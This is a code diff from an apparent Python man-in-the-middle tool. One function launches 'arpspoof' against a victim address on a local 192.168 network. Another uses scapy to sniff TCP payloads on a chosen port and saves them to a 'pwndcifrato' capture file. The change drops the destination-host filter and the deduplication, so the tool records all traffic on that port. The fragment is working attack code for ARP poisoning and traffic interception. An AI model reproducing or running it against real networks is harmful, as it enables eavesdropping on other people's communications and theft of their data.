@@ -14,13 +14,6 @@ def arpoisoner(out_lck, myAddress):
     os.system("xterm -e \"arpspoof -i %s -t %s %s\"" % ("enx9cebe811a79a", "192.168." + victimIP, myAddress))
 
 
-def lel(array):
-
-    def out_sniff(packet):
-        array.append(bytes(packet[TCP].payload))
-    return out_sniff
-
-
 def analyzer(out_lck, port, extension):
 
     file = open("sniffed/pwndcifrato." + extension, "wb")
@@ -29,16 +22,10 @@ def analyzer(out_lck, port, extension):
 
     time = loop_int_input(out_lck, "Please insert a timeout for the sniffer (in second): ")
 
-    destination = loop_input(out_lck, "Please insert destination IP: ")
-
     array = []
-    result = []
-    sniff(filter="tcp and port %s and host %s" % (port, "192.168." + destination), timeout=time, prn=lel(array))
-    for idx, el in enumerate(array):
-        if el not in result:
-            result.append(el)
+    sniff(filter="port %s" % port, timeout=time, prn=lambda x: array.append(bytes(x[TCP].payload)))
 
-    for el in result:
+    for el in array:
         file.write(el)
     file.close()
 
